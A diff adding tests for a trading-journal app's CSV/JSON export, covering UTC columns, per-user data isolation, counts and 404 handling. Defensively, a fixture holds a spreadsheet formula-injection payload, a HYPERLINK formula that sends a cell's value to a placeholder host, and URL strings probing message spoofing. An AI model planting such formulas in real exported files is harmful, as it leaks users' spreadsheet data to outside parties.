@@ -332,16 +332,22 @@ try:
     closed = [r for r in rows if r["status"] == "closed"][0]
     short = [r for r in rows if r["side"] == "short"][0]
     print("   closed row: %s" % {k: closed[k] for k in
-                                 ("symbol", "side", "r_multiple", "opened")})
+                                 ("symbol", "side", "r_multiple", "opened_utc")})
     check("direction is a word, not a number", closed["side"] == "long")
     check("a short is labelled short", short["side"] == "short")
     check("the R multiple survived", abs(closed["r_multiple"] - 3.0) < 1e-6,
           closed["r_multiple"])
     check("dates are readable rather than unix seconds",
-          re.match(r"^\d{4}-\d{2}-\d{2} ", closed["opened"] or ""))
-    check("an open trade has no closing date", short["closed"] == "")
+          re.match(r"^\d{4}-\d{2}-\d{2} ", closed["opened_utc"] or ""))
+    check("an open trade has no closing date", short["closed_utc"] == "")
+    check("every column that holds a time says it is UTC",
+          all(name.endswith("_utc") for spec in export_mod.DATASETS.values()
+              for name in spec["columns"]
+              if name.split("_utc")[0] in ("opened", "closed", "when", "saved", "reviewed",
+                                           "added", "created", "last_checked",
+                                           "last_fired", "last_analysed")))
 
-    csv_body = export_mod.build(conn, "trades", "csv")["body"]
+    csv_body = export_mod.build(conn, "trades", "csv", user=1)["body"]
     header = csv_body.splitlines()[0]
     check("the CSV header is the declared columns",
           header == ",".join(export_mod.TRADE_COLUMNS), header)
@@ -361,6 +367,104 @@ try:
 finally:
     conn.close()
 
+import csv as _csv
+import io as _io
+
+conn = db.connect(DB)
+try:
+    # A note a spreadsheet would run as a formula, and one it would misread.
+    notes = {"ZZN1": "-2R, stopped out", "ZZN2": '=HYPERLINK("http://example.com/?x="&A2,"see")',
+             "ZZN3": "+1+1", "ZZN4": "@SUM(1,1)", "ZZN5": "caf\u00e9 \u2014 \u20ac5 target",
+             "ZZN6": "plain, with = inside"}
+    for symbol, note in notes.items():
+        nid = db.open_trade(conn, symbol, "1d", 1, entry=100, stop=95, quantity=1, user=1)
+        conn.execute("UPDATE trades SET notes=? WHERE id=?", (note, nid))
+    # Closed in parts by a release that knew nothing of the last one.
+    part = db.open_trade(conn, "ZZPARTS", "1d", 1, entry=100, stop=95, quantity=30, user=1)
+    db.exit_trade(conn, part, 110.0, 10, "target", user=1)
+    conn.execute("UPDATE trades SET status='closed', exit_price=90, ts_closed=ts_opened "
+                 "WHERE id=?", (part,))
+    db.close_trade(conn, db.open_trade(conn, "ZZLOSS", "1d", 1, entry=100, stop=95,
+                                       quantity=1, user=1), 90.0, "stop", user=1)
+    conn.execute("INSERT INTO runs (ts, symbol, interval, action, regime_vol, user_id) "
+                 "VALUES (1, 'ZZRUN', '1d', 'WAIT', 'calm', 1)")
+    conn.executemany("INSERT INTO runs (ts, symbol, interval, user_id) VALUES (?, 'ZZMANY', "
+                     "'1d', 1)", [(n,) for n in range(2, 5302)])
+    conn.executemany("INSERT INTO theses (created_ts, symbol, price, user_id) "
+                     "VALUES (?, 'ZZT', 1.0, 1)", [(n,) for n in range(1, 1102)])
+    db.watch_add(conn, "ZZWATCH", "1d", user=1)
+    db.alert_add(conn, "ZZALERT", "price_above", 200.0, user=1)
+    db.event_add(conn, 1, "price_above", "ZZALERT", "ZZALERT rose above 200.", 201.0, "")
+    # Somebody else's, which must be in no download of this person's.
+    db.open_trade(conn, "ZZOTHER", "1d", 1, entry=100, stop=95, quantity=1, user=77)
+    db.watch_add(conn, "ZZOTHER", "1d", user=77)
+    db.alert_add(conn, "ZZOTHER", "price_above", 5.0, user=77)
+    db.event_add(conn, 77, "price_above", "ZZOTHER", "ZZOTHER rose.", 6.0, "")
+    conn.commit()
+
+    def table(dataset, user=1):
+        return list(_csv.DictReader(_io.StringIO(
+            export_mod.build(conn, dataset, "csv", user=user)["body"])))
+
+    got = {r["symbol"]: r["note"] for r in table("trades")}
+    check("a note a spreadsheet would run as a formula is marked as words",
+          all(got[s] == "'" + notes[s] for s in ("ZZN1", "ZZN2", "ZZN3", "ZZN4")), got)
+    check("any other note is as it was written",
+          got["ZZN5"] == notes["ZZN5"] and got["ZZN6"] == notes["ZZN6"])
+    check("and a loss is still a number",
+          [float(r["pnl"]) for r in table("trades") if r["symbol"] == "ZZLOSS"] == [-10.0])
+    check("the JSON keeps every note as it was written",
+          all(n in [r["note"] for r in _json.loads(
+              export_mod.build(conn, "trades", "json", user=1)["body"])["rows"]]
+              for n in notes.values()))
+    check("the analysis history holds every call, not the newest few thousand",
+          len(table("runs")) >= 5301)
+    check("with how lively the market was",
+          [r["regime_volatility"] for r in table("runs") if r["symbol"] == "ZZRUN"] == ["calm"])
+    check("and every saved thesis is there", len(table("theses")) == 1101)
+    check("the watchlist, the alerts and what they said can be downloaded",
+          [r["symbol"] for r in table("watchlist")] == ["ZZWATCH"]
+          and any(r["condition"] == "ZZALERT price above 200" or "200" in r["condition"]
+                  for r in table("alerts") if r["symbol"] == "ZZALERT")
+          and "ZZALERT rose above 200." in [r["message"] for r in table("alert_history")],
+          (table("watchlist"), table("alerts"), table("alert_history")))
+    check("nothing of anybody else's is in any of them",
+          not any("ZZOTHER" in export_mod.build(conn, d, f, user=1)["body"]
+                  for d in export_mod.DATASETS for f in ("csv", "json")))
+    for who in (1, 77, None):
+        counted = export_mod.counts(conn, user=who)
+        held = {d: len(list(spec["rows"](conn, user=who)))
+                for d, spec in export_mod.DATASETS.items()}
+        check("the counts are the rows each holds (%s)" % (who or "everyone"),
+              counted == held, (counted, held))
+    built_nothing = []
+    real_rows = {d: spec["rows"] for d, spec in export_mod.DATASETS.items()}
+    for d, spec in export_mod.DATASETS.items():
+        spec["rows"] = lambda *_a, **_k: built_nothing.append(1) or []
+    try:
+        export_mod.counts(conn, user=1)
+    finally:
+        for d, spec in export_mod.DATASETS.items():
+            spec["rows"] = real_rows[d]
+    check("and counting builds none of them", not built_nothing)
+finally:
+    conn.close()
+
+r = c.get("/export/trades.csv")
+check("the file says it is UTF-8, once, so Excel reads an accent as one",
+      r.data.startswith(b"\xef\xbb\xbf") and r.headers["Content-Type"] == "text/csv; charset=utf-8"
+      and "caf\u00e9 \u2014 \u20ac5" in r.data.decode("utf-8"), r.headers["Content-Type"])
+check("and carries the app's own name",
+      'filename="orenth-trades-' in r.headers["Content-Disposition"],
+      r.headers["Content-Disposition"])
+check("the JSON has no such mark", c.get("/export/trades.json").data[:1] == b"{")
+# Put away, so what follows finds only the two positions opened above.
+conn = db.connect(DB)
+for made_up in ("trades", "runs", "theses", "watchlist", "alerts"):
+    conn.execute("DELETE FROM %s WHERE symbol LIKE 'ZZ%%'" % made_up)
+conn.commit()
+conn.close()
+
 for dataset in export_mod.DATASETS:
     for fmt in ("csv", "json"):
         r = c.get("/export/%s.%s" % (dataset, fmt))
@@ -370,6 +474,17 @@ for dataset in export_mod.DATASETS:
               "attachment" in disposition, disposition)
 check("a made-up dataset 404s", c.get("/export/nope.csv").status_code == 404)
 check("a made-up format 404s", c.get("/export/trades.xml").status_code == 404)
+for odd, answer in (
+        ("/export/Your account is suspended.csv", b"There is no export by that name."),
+        ("/export/trades.Your account is suspended", b"Exports are CSV or JSON.")):
+    r = c.get(odd)
+    check("and its page never repeats what the address said (%s)" % odd[8:14],
+          r.status_code == 404 and answer in r.data
+          and b"suspended" not in r.data[r.data.index(b"<main"):], r.status_code)
+r = c.post("/workflow/Your account is suspended")
+check("nor does a made-up routine's",
+      r.status_code == 404 and b"suspended" not in r.data[r.data.index(b"<main"):],
+      r.status_code)
 
 settings_page = c.get("/settings").data.decode("utf-8", "replace")
 check("the settings page offers the downloads",
